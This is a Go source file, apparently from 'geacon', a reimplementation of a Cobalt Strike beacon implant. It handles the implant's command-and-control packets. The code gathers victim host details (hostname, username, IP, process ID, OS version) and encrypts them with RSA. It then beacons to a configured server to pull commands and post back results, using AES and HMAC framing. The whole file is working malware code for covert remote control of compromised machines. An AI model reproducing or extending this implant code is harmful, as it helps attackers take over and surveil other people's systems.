package packet

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/sysinfo"
	"geacon/cmd/util"
	"github.com/imroc/req"
	"strconv"
	"time"
)

var (
	encryptedMetaInfo string
	clientID int
)



func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte,4)
	binary.BigEndian.PutUint32(bBytes,uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func DecryptPacket(b []byte) []byte {
	decrypted , err := crypt.AesCBCDecrypt(b,config.AesKey)
	if err != nil {
		panic(err)
	}
	return decrypted
}


func EncryptPacket() {

}


func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	commandTypeBytes := make([]byte,4)
	_ , err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte,4)
	_ , err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte,commandLen)
	_ , err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - ( 4 + 4 + commandLen )
	return  commandType, commandBuf

}

func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte,4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte,4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte,4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted , err := crypt.AesCBCEncrypt(buf.Bytes(),config.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + crypt.HmacHashLen
	sendLenBytes := make([]byte,4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := crypt.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

func EncryptedMetaInfo() string {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted , err := crypt.RsaEncrypt(packetUnencrypted)
	if err != nil {
		panic(err)
	}

	//TODO c2profile encode method
	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
	return finalPakcet
}

func MakeMetaInfo() []byte {
	crypt.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]


	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	osVersion := sysinfo.GetOSVersion()
	localIP := sysinfo.GetLocalIP()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()
	isOSx64 := sysinfo.IsOSX64()
	isProcx64 := sysinfo.IsProcessX64()
	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()
	onlineInfo := fmt.Sprintf("%d\t%d\t%s\t%s\t%s\t%s\t%d\t%d",
		clientID,processID,osVersion,localIP,hostName,currentUser,isOSx64,isProcx64)
	onlineInfoBytes := []byte(onlineInfo)
	metaInfo := util.BytesCombine(config.GlobalKey,localeANSI,localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum,metaLen,metaInfo)

	return packetToEncrypt
}

func FirstBlood() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for ; ;  {
		resp := HttpGet(config.GetUrl,encryptedMetaInfo)
		if resp != nil {
			fmt.Printf("firstblood: %v\n",resp)
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(config.WaitTime)
	return true
}


func PullCommand() *req.Resp {
	resp := HttpGet(config.GetUrl,encryptedMetaInfo)
	fmt.Printf("pullcommand: %v\n",resp.Request().URL)
	return resp
}

func PushResult(b []byte) *req.Resp {
	url := config.PostUrl + strconv.Itoa(clientID)
	resp := HttpPost(url,b)
	fmt.Printf("pushresult: %v\n",resp.Request().URL)
	return resp
}